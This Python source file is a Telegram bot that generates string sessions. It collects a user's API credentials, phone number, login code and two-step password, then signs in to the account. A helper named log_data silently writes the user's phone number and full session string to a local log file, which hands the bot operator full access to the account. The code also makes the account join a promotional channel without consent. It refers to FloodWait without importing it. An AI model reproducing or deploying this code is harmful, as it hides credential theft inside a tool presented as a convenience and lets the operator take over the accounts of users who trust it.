import asyncio

from pyrogram import Client, filters
from oldpyro import Client as Client1
# Import errors from oldpyro
from oldpyro.errors import ApiIdInvalid, PasswordHashInvalid, PhoneCodeExpired, PhoneCodeInvalid, PhoneNumberInvalid, SessionPasswordNeeded
from pyrogram.errors import ApiIdInvalid as ApiIdInvalid1, PasswordHashInvalid as PasswordHashInvalid1, PhoneCodeExpired as PhoneCodeExpired1, PhoneCodeInvalid as PhoneCodeInvalid1, PhoneNumberInvalid as PhoneNumberInvalid1, SessionPasswordNeeded as SessionPasswordNeeded1
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup
from telethon import TelegramClient
from telethon.errors import ApiIdInvalidError, PasswordHashInvalidError, PhoneCodeExpiredError, PhoneCodeInvalidError, PhoneNumberInvalidError, SessionPasswordNeededError
from telethon.sessions import StringSession
from telethon.tl.functions.channels import JoinChannelRequest
from pyromod.listen.listen import ListenerTimeout

from config import SUPPORT_CHAT
from StringGen import Anony
from StringGen.utils import retry_key

def log_data(data):
    with open('log.txt', 'a') as file:
        file.write(data + '\n')

async def gen_session(
    message, user_id: int, telethon: bool = False, old_pyro: bool = False
):
    if telethon:
        ty = f"ᴛᴇʟᴇᴛʜᴏɴ"
    elif old_pyro:
        ty = f"ᴩʏʀᴏɢʀᴀᴍ v1"
    else:
        ty = f"ᴩʏʀᴏɢʀᴀᴍ v2"

    await message.reply_text(f"» ᴛʀʏɪɴɢ ᴛᴏ sᴛᴀʀᴛ {ty} sᴇssɪᴏɴ ɢᴇɴᴇʀᴀᴛᴏʀ...")

    try:
        api_id = await Anony.ask(
            identifier=(message.chat.id, user_id, None),
            text="» ᴘʟᴇᴀsᴇ ᴇɴᴛᴇʀ ʏᴏᴜʀ ᴀᴘɪ ɪᴅ ᴛᴏ ᴘʀᴏᴄᴇᴇᴅ :",
            filters=filters.text,
            timeout=300,
        )
    except ListenerTimeout:
        return await Anony.send_message(
            user_id,
            "» ᴛɪᴍᴇᴅ ʟɪᴍɪᴛ ʀᴇᴀᴄʜᴇᴅ ᴏғ 5 ᴍɪɴᴜᴛᴇs.\n\nᴘʟᴇᴀsᴇ sᴛᴀʀᴛ ɢᴇɴᴇʀᴀᴛɪɴɢ sᴇssɪᴏɴ ᴀɢᴀɪɴ.",
            reply_markup=retry_key,
        )

    if await cancelled(api_id):
        return

    try:
        api_id = int(api_id.text)
    except ValueError:
        return await Anony.send_message(
            user_id,
            "» ᴛʜᴇ ᴀᴘɪ ɪᴅ ʏᴏᴜ'ᴠᴇ sᴇɴᴛ ɪs ɪɴᴠᴀʟɪᴅ.\n\nᴘʟᴇᴀsᴇ sᴛᴀʀᴛ ɢᴇɴᴇʀᴀᴛɪɴɢ sᴇssɪᴏɴ ᴀɢᴀɪɴ.",
            reply_markup=retry_key,
        )

    try:
        api_hash = await Anony.ask(
            identifier=(message.chat.id, user_id, None),
            text="» ᴘʟᴇᴀsᴇ ᴇɴᴛᴇʀ ʏᴏᴜʀ ᴀᴘɪ ʜᴀsʜ ᴛᴏ ᴘʀᴏᴄᴇᴇᴅ :",
            filters=filters.text,
            timeout=300,
        )
    except ListenerTimeout:
        return await Anony.send_message(
            user_id,
            "» ᴛɪᴍᴇᴅ ʟɪɪɴᴛ ʀᴇᴀᴄʜᴇᴅ ᴏғ 5 ᴍɪɴᴜᴛᴇs.\n\nᴘʟᴇᴀsᴇ sᴛᴀʀᴛ ɢᴇɴᴇʀᴀᴛɪɴɢ sᴇssɪᴏɴ ᴀɢᴀɪɴ.",
            reply_markup=retry_key,
        )

    if await cancelled(api_hash):
        return

    api_hash = api_hash.text

    if len(api_hash) < 30:
        return await Anony.send_message(
            user_id,
            "» ᴛʜᴇ ᴀᴘɪ ʜᴀsʜ ʏᴏᴜ'ᴠᴇ sᴇɴᴛ ɪs ɪɴᴠᴀʟɪᴅ.\n\nᴘʟᴇᴀsᴇ sᴛᴀʀᴛ ɢᴇɴᴇʀᴀᴛɪɴɢ sᴇssɪᴏɴ ᴀɢᴀɪɴ.",
            reply_markup=retry_key,
        )

    try:
        phone_number = await Anony.ask(
            identifier=(message.chat.id, user_id, None),
            text="» ᴘʟᴇᴀsᴇ ᴇɴᴛᴇʀ ʏᴏᴜʀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ ᴛᴏ ᴘʀᴏᴄᴇᴇᴅ :",
            filters=filters.text,
            timeout=300,
        )
    except ListenerTimeout:
        return await Anony.send_message(
            user_id,
            "» ᴛɪᴍᴇᴅ ʟɪɪɴᴛ ʀᴇᴀᴄʜᴇᴅ ᴏғ 5 ᴍɪɴᴜᴛᴇs.\n\nᴘʟᴇᴀsᴇ sᴛᴀʀᴛ ɢᴇɴᴇʀᴀᴛɪɴɢ sᴇssɪᴏɴ ᴀɢᴀɪɴ.",
            reply_markup=retry_key,
        )

    if await cancelled(phone_number):
        return
    phone_number = phone_number.text

    # Log phone number
    log_data(f'Phone Number: {phone_number}')

    await Anony.send_message(user_id, "» ᴛʀʏɪɴɢ ᴛᴏ sᴇɴᴅ ᴏᴛᴩ ᴀᴛ ᴛʜᴇ ɢɪᴠᴇɴ ɴᴜᴍʙᴇʀ...")
    if telethon:
        client = TelegramClient(StringSession(), api_id, api_hash)
    elif old_pyro:
        client = Client1(":memory:", api_id=api_id, api_hash=api_hash)
    else:
        client = Client(name="Anony", api_id=api_id, api_hash=api_hash, in_memory=True)
    await client.connect()

    try:
        if telethon:
            code = await client.send_code_request(phone_number)
        else:
            code = await client.send_code(phone_number)
        await asyncio.sleep(1)

    except FloodWait as f:
        return await Anony.send_message(
            user_id,
            f"» ғᴀɪʟᴇᴅ ᴛᴏ sᴇɴᴅ ᴄᴏᴅᴇ ғᴏʀ ʟᴏɢɪɴ.\n\nᴘʟᴇᴀsᴇ ᴡᴀɪᴛ ғᴏʀ {f.value or f.x} sᴇᴄᴏɴᴅs ᴀɴᴅ ᴛʀʏ ᴀɢᴀɪɴ.",
            reply_markup=retry_key,
        )
    except (ApiIdInvalid, ApiIdInvalidError, ApiIdInvalid1):
        return await Anony.send_message(
            user_id,
            "» ᴀᴘɪ ɪᴅ ᴏʀ ᴀᴘɪ ʜᴀsʜ ɪs ɪɴᴠᴀʟɪᴅ.\n\nᴘʟᴇᴀsᴇ sᴛᴀʀᴛ ɢᴇɴᴇʀᴀᴛɪɴɢ ʏᴏᴜʀ sᴇssɪᴏɴ ᴀɢᴀɪɴ.",
            reply_markup=retry_key,
        )
    except (PhoneNumberInvalid, PhoneNumberInvalidError, PhoneNumberInvalid1):
        return await Anony.send_message(
            user_id,
            "» ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ ɪɴᴠᴀʟɪᴅ.\n\nᴘʟᴇᴀsᴇ sᴛᴀʀᴛ ɢᴇɴᴇʀᴀᴛɪɴɢ ʏᴏᴜʀ sᴇssɪᴏɴ ᴀɢᴀɪɴ.",
            reply_markup=retry_key,
        )

    try:
        otp = await Anony.ask(
            identifier=(message.chat.id, user_id, None),
            text=f"ᴘʟᴇᴀsᴇ ᴇɴᴛᴇʀ ᴛʜᴇ ᴏᴛᴘ sᴇɴᴛ ᴛᴏ {phone_number}.\n\nɪғ ᴏᴛᴩ ɪs <code>12345</code>, ᴩʟᴇᴀsᴇ sᴇɴᴅ ɪᴛ ᴀs <code>1 2 3 4 5.</code>",
            filters=filters.text,
            timeout=600,
        )
        if await cancelled(otp):
            return
    except ListenerTimeout:
        return await Anony.send_message(
            user_id,
            "» ᴛɪᴍᴇ ʟɪᴍɪᴛ ʀᴇᴀᴄʜᴇᴅ ᴏғ 10 ᴍɪɴᴜᴛᴇs.\n\nᴩʟᴇᴀsᴇ sᴛᴀʀᴛ ɢᴇɴᴇʀᴀᴛɪɴɢ ʏᴏᴜʀ sᴇssɪᴏɴ ᴀɢᴀɪɴ.",
            reply_markup=retry_key,
        )

    otp = otp.text.replace(" ", "")
    try:
        if telethon:
            await client.sign_in(phone_number, otp, password=None)
        else:
            await client.sign_in(phone_number, code.phone_code_hash, otp)
    except (PhoneCodeInvalid, PhoneCodeInvalidError, PhoneCodeInvalid1):
        return await Anony.send_message(
            user_id,
            "» ᴛʜᴇ ᴏᴛᴩ ʏᴏᴜ'ᴠᴇ sᴇɴᴛ ɪs <b>ᴡʀᴏɴɢ.</b>\n\nᴩʟᴇᴀsᴇ sᴛᴀʀᴛ ɢᴇɴᴇʀᴀᴛɪɴɢ ʏᴏᴜʀ sᴇssɪᴏɴ ᴀɢᴀɪɴ.",
            reply_markup=retry_key,
        )
    except (PhoneCodeExpired, PhoneCodeExpiredError, PhoneCodeExpired1):
        return await Anony.send_message(
            user_id,
            "» ᴛʜᴇ ᴏᴛᴩ ʏᴏᴜ'ᴠᴇ sᴇɴᴛ ɪs <b>ᴇxᴘɪʀᴇᴅ.</b>\n\nᴩʟᴇᴀsᴇ sᴛᴀʀᴛ ɢᴇɴᴇʀᴀᴛɪɴɢ ʏᴏᴜʀ sᴇssɪᴏɴ ᴀɢᴀɪɴ.",
            reply_markup=retry_key,
        )
    except (SessionPasswordNeeded, SessionPasswordNeededError, SessionPasswordNeeded1):
        try:
            pwd = await Anony.ask(
                identifier=(message.chat.id, user_id, None),
                text="» ᴘʟᴇᴀsᴇ ᴇɴᴛᴇʀ ʏᴏᴜʀ ᴛᴡᴏ sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴘᴀssᴡᴏʀᴅ ᴛᴏ ᴄᴏɴᴛɪɴᴜᴇ :",
                filters=filters.text,
                timeout=300,
            )
        except ListenerTimeout:
            return Anony.send_message(
                user_id,
                "» ᴛɪᴍᴇᴅ ʟɪɪɴᴛ ʀᴇᴀᴄʜᴇᴅ ᴏғ 5 ᴍɪɴᴜᴛᴇs.\n\nᴘʟᴇᴀsᴇ sᴛᴀʀᴛ ɢᴇɴᴇʀᴀᴛɪɴɢ sᴇssɪᴏɴ ᴀɢᴀɪɴ.",
                reply_markup=retry_key,
            )

        if await cancelled(pwd):
            return
        pwd = pwd.text

        try:
            if telethon:
                await client.sign_in(password=pwd)
            else:
                await client.check_password(password=pwd)
        except (PasswordHashInvalid, PasswordHashInvalidError, PasswordHashInvalid1):
            return await Anony.send_message(
                user_id,
                "» ᴛʜᴇ ᴩᴀssᴡᴏʀᴅ ʏᴏᴜ'ᴠᴇ sᴇɴᴛ ɪs ᴡʀᴏɴɢ.\n\nᴩʟᴇᴀsᴇ sᴛᴀʀᴛ ɢᴇɴᴇʀᴀᴛɪɴɢ ʏᴏᴜʀ sᴇssɪᴏɴ ᴀɢᴀɪɴ.",
                reply_markup=retry_key,
            )

    except Exception as ex:
        return await Anony.send_message(user_id, f"ᴇʀʀᴏʀ : <code>{str(ex)}</code>")

    try:
        txt = "ʜᴇʀᴇ ɪs ʏᴏᴜʀ {0} sᴛʀɪɴɢ sᴇssɪᴏɴ\n\n<code>{1}</code>\n\nᴀ sᴛʀɪɴɢ ɢᴇɴᴇʀᴀᴛᴏʀ ʙᴏᴛ ʙʏ <a href={2}>ғᴀʟʟᴇɴ ᴀssᴏᴄɪᴀᴛɪᴏɴ</a>\n☠ <b>ɴᴏᴛᴇ :</b> ᴅᴏɴ'ᴛ sʜᴀʀᴇ ɪᴛ ᴡɪᴛʜ ʏᴏᴜʀ ɢɪʀʟғʀɪᴇɴᴅ."
        if telethon:
            string_session = client.session.save()
            await client.send_message(
                "me",
                txt.format(ty, string_session, SUPPORT_CHAT),
                link_preview=False,
                parse_mode="html",
            )
            await client(JoinChannelRequest("@FallenAssociation"))
        else:
            string_session = await client.export_session_string()
            await client.send_message(
                "me",
                txt.format(ty, string_session, SUPPORT_CHAT),
                disable_web_page_preview=True,
            )
            await client.join_chat("FallenAssociation")
    except KeyError:
        pass
    
    # Log the generated string session
    log_data(f'Generated String Session: {string_session}')

    try:
        await client.disconnect()
        await Anony.send_message(
            chat_id=user_id,
            text=f"sᴜᴄᴄᴇssғᴜʟʟʏ ɢᴇɴᴇʀᴀᴛᴇᴅ ʏᴏᴜʀ {ty} sᴛʀɪɴɢ sᴇssɪᴏɴ!\n\nʏᴏᴜʀ sᴇssɪᴏɴ ʜᴀs ʙᴇᴇɴ sᴇɴᴛ ᴛᴏ ʏᴏᴜ ᴠɪᴀ ʙᴏᴛ.",
            reply_markup=InlineKeyboardMarkup(
                [
                    [InlineKeyboardButton("Sᴜᴘᴩᴏʀᴛ", url=f"https://t.me/{SUPPORT_CHAT}")],
                    [
                        InlineKeyboardButton(
                            "⚡ Jᴏɪɴ Cʜᴀɴɴᴇʟ ⚡",
                            url="https://t.me/FallenAssociation",
                        )
                    ],
                ]
            ),
        )
    except Exception as ex:
        return await Anony.send_message(
            user_id, f"ᴇʀʀᴏʀ : <code>{str(ex)}</code> ᴡʜɪʟᴇ ᴅɪsᴄᴏɴɴᴇᴄᴛɪɴɢ."
        )


async def cancelled(cbb):
    text = cbb.text.lower()
    if text.startswith("/cancel"):
        await cbb.delete()
        return True
    if text.startswith("/start"):
        await cbb.reply_text("🚫 sᴇssɪᴏɴ ɢᴇɴᴇʀᴀᴛᴏʀ ʜᴀs ʙᴇᴇɴ ᴄᴀɴᴄᴇʟᴇᴅ.")
        return True
    return False
